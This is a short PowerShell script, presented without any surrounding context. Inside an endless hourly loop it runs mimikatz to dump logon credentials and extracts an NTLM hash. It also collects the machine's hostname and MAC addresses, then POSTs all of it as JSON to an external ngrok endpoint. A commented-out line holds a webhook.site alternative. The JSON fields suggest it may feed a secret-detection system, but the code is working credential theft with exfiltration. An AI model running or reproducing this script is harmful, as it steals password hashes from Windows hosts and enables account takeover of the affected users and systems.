 do {
    $NTLM_cmd = ./mimikatz.exe privilege::debug sekurlsa::logonpasswords exit | Select-String NTLM 
    $NTLM = ($NTLM_cmd -split '\s+')[4]
    echo $NTLM

    $hostname = hostname
    $mac = Get-WmiObject win32_networkadapterconfiguration | Select-Object -First 2 -ExpandProperty macaddress
    
    $postParams = @{
        data = @{

                value = $NTLM
                detector = @{
                    name = "NTLM_hash"
                    provider = "agent_local"
                    properties = @{
                        hostname = $hostname
                        MAC= $mac
                    }
                }
                confidence = "VERY LIKELY"
                secret_type = "NTLM_hash"

           
        }
    }
    #Invoke-WebRequest -Uri https://webhook.site/3e5ec05c-2bcd-47d1-af56-fb46ee0c84f9 -Method POST -Body ($postParams | ConvertTo-Json -Depth 5) -ContentType "application/json"
    Invoke-WebRequest -Uri https://fca1-193-225-122-113.ngrok-free.app/secrets -Method POST -Body ($postParams | ConvertTo-Json -Depth 5) -ContentType "application/json"

    Start-Sleep -s 3600
    
} while (1)
 
